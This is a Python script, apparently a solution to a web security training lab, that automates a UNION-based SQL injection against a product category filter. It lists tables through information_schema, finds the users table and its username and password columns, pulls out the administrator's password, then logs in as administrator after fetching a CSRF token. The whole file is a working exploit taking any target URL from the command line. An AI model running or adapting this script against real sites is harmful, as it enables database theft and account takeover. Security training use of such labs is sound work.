# Lab5 - Listing the contents of non oracle database

import sys
import requests
import urllib3
import re
import os
from bs4 import BeautifulSoup

# from Labs import lab_02


# sys.path.append(os.path.join(os.getcwd(), 'Labs'))
# import lab_02

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sqli(url, payload):
    uri = "/filter?category=Lifestyle"  # Vulnerable parameter
    print(f"Sending request to {url + uri + payload}")
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    return r.text


def user_table(url):
    payload = "'union select table_name, NULL from information_schema.tables-- "
    res = exploit_sqli(url, payload)
    soup = BeautifulSoup(res, "html.parser")
    user_table = soup.find(string=re.compile(".*users_*"))
    if user_table:
        print("[+] Found table name: ", user_table)
        return user_table
    else:
        print("[-] Table name not found!")
        return False


def user_columns(url, table):
    payload = f"'union select column_name, NULL from information_schema.columns where table_name='{table}'-- "
    res = exploit_sqli(url, payload)
    soup = BeautifulSoup(res, "html.parser")
    user_columns = soup.find(string=re.compile(".*username_*"))
    password_columns = soup.find(string=re.compile(".*password_*"))
    if user_columns and password_columns:
        print("[+] Found columns: " + user_columns + " and " + password_columns)
        return user_columns, password_columns
    else:
        print("[-] Columns not found!")
        return False


def user_data(url, table, columns):
    payload = f"'union select {columns[0]}, {columns[1]} from {table}-- "
    res = exploit_sqli(url, payload)
    soup = BeautifulSoup(res, "html.parser")
    user_data = soup.find(string=re.compile(".*administrator*"))

    if user_data:
        password = user_data.find_next("td")
        if password:
            print(f"[+] Found data {user_data} : {password.text}")
            return f"{user_data} : {password.text}"
    else:
        print("[-] Data not found!")
        return False


def get_csrf(s, url):
    uri = "/login"
    r = s.get(url + uri, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf


def login(s, url, username, password):
    uri = "/login"
    csrf = get_csrf(s, url)
    data = {"csrf": csrf, "username": username, "password": password}
    r = s.post(url + uri, data=data, verify=False, proxies=proxies,allow_redirects=False)
    if r.status_code == 302 and 'Location' in r.headers:
        redirect_url = r.headers['Location']
        account_page = s.get(url+redirect_url, verify=False, proxies=proxies)
        if "administrator" in account_page.text:
            print("[+] Login successful!")
        return True
    else:
        print("[-] Login unsuccessful!")
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    user_table = user_table(url)
    if user_table:
        user_columns = user_columns(url, user_table)
        if user_columns:
            user_data = user_data(url, user_table, user_columns)
            if user_data:
                username = user_data.split(":")[0].strip()
                password = user_data.split(":")[1].strip()

                s = requests.Session()
                login(s, url, username, password)
